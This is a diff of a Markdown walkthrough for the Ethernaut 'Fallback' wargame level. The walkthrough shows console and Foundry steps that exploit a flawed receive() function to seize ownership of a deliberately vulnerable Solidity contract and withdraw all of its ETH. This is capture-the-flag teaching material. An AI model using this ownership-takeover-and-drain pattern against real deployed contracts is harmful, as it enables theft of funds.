@@ -1,147 +1,104 @@
-# Fallback – Level 1 Walkthrough
+# Fallback
 
-Welcome to the first level of the **Ethernaut** wargame by [OpenZeppelin](https://ethernaut.openzeppelin.com/), focused on fallback function vulnerabilities.
+## Objective
 
----
-
-## Challenge Objective
-
-You are given a contract with a fallback function that can be exploited. Your goal is to:
-
-- Become the contract owner by exploiting the fallback logic
-- Withdraw the contract's ETH balance
-- Submit the instance to complete the level
+Exploit the fallback function vulnerability in the provided smart contract to become the contract owner and withdraw its ETH balance.
 
 ---
 
-## Prerequisites
+## Getting Started
 
-Before you begin, ensure the following:
+1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
+2. Select the **"Fallback"** level
+3. Click **“Get new instance”** and approve the transaction in MetaMask
+4. The instance is now deployed and available as the `contract` object in the browser console
+5. Save the instance address:
 
-- **MetaMask** is installed and connected
-- **Test ETH** is available (Goerli, Sepolia, etc.)
-- Familiarity with using **browser DevTools** and executing JavaScript commands
-- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)
-
----
-
-## Contract Overview
-
-Key parts of the `Fallback.sol` contract:
-
-```solidity
-mapping(address => uint) public contributions;
-address public owner;
-
-function contribute() public payable {
-    require(msg.value < 0.001 ether);
-    contributions[msg.sender] += msg.value;
-    if (contributions[msg.sender] > contributions[owner]) {
-        owner = msg.sender;
-    }
-}
-
-receive() external payable {
-    require(msg.value > 0 && contributions[msg.sender] > 0);
-    owner = msg.sender;
-}
-
-function withdraw() public onlyOwner {
-    payable(owner).transfer(address(this).balance);
-}
-```
+    ```js
+    contract.address
+    ```
 
 ---
 
-## Walkthrough – Step by Step
+## Walkthrough
 
-### 🗒️ Step 1: Check the Current Owner (Optional)
+### Step 1: Check the Current Owner
 
 ```js
 await contract.owner()
 ```
-> The owner is likely not your address yet.
+
+**Explanation:**
+This checks the current owner of the contract. Initially, it will not be your address.
 
 ---
 
-### 🛠️ Step 2: Make a Small Contribution
+### Step 2: Make a Small Contribution
 
 ```js
 await contract.contribute({ value: "1" }) // 1 wei is enough
 ```
-> This registers your address with a nonzero contribution.
+
+**Explanation:**
+This registers your address with a nonzero contribution, which is required to exploit the fallback logic.
 
 ---
 
-### 🔍 Step 3: Trigger the Fallback
+### Step 3: Trigger the Fallback Function
 
 ```js
 await contract.sendTransaction({ value: "1" })
 ```
-> This calls the `receive()` function, which checks your contribution and sets you as the owner.
+
+**Explanation:**
+This sends ETH directly to the contract, invoking the `receive()` function. Since you have a contribution, this sets you as the new owner.
 
 ---
 
-### ✅ Step 4: Confirm Ownership
+### Step 4: Confirm Ownership
 
 ```js
 await contract.owner()
 ```
-> The owner should now be your address.
+
+**Explanation:**
+Verifies that you are now the contract owner after exploiting the fallback logic.
 
 ---
 
-### 💸 Step 5: Withdraw All ETH
+### Step 5: Withdraw All ETH
 
 ```js
 await contract.withdraw()
 ```
-> As the new owner, you can drain the contract's balance.
+
+**Explanation:**
+As the new owner, you can now withdraw the contract's entire ETH balance.
 
 ---
 
-### 🚀 Step 6: Submit the Level
+### Step 6: Submit the Level
 
-Click **“Submit instance”** in the UI and confirm the MetaMask transaction. Once successful, the level is marked as **completed**.
-
----
-
-## 🛠️ Alternative: Using Foundry Script
-
-You can automate the exploit with a script:
-
-```solidity
-fallbackInstance.contribute{ value: 1 wei }();
-address(fallbackInstance).call{ value: 1 wei }("");
-fallbackInstance.withdraw();
-```
+Click **“Submit instance”** in the UI and confirm the MetaMask transaction. The level is complete once the transaction is successful.
 
 ---
 
-## 💡 What You Learn
+## What You Learn
 
-- How fallback and receive functions can be abused
-- The importance of contribution checks in contract logic
-- How to claim ownership by exploiting fallback logic
-- The risks of improper access control in smart contracts
+This level teaches the following:
 
----
-
-## Concepts Covered
-
-| Concept             | Description                                                                  |
-| ------------------- | ---------------------------------------------------------------------------- |
-| Fallback Functions  | Special functions triggered by direct ETH transfers                          |
-| Ownership Takeover  | Ownership can change via fallback if contribution conditions are met         |
-| Withdrawal Patterns | Only the owner can withdraw contract funds                                   |
-| Web3 Interaction    | Using injected contract instances and console JS to interact                 |
+* How fallback and receive functions can be abused if not properly secured
+* The importance of validating contribution logic and access control
+* How ownership can be unintentionally transferred through fallback logic
+* Defensive patterns to prevent unauthorized ownership changes
 
 ---
 
-## Resources
+## Resources Used
 
-- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
-- [YouTube Walkthrough](https://www.youtube.com/watch?v=TQKj2xvsGec)
-- [blog](https://shubhamm.me/blog/08-ethernaut-challenges-fallback)
+* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
+* [Solidity Docs](https://docs.soliditylang.org/)
+* [YouTube Walkthrough](https://www.youtube.com/watch?v=TQKj2xvsGec)
+* [Blog Writeup](https://shubhamm.me/blog/08-ethernaut-challenges-fallback)
 
 ---
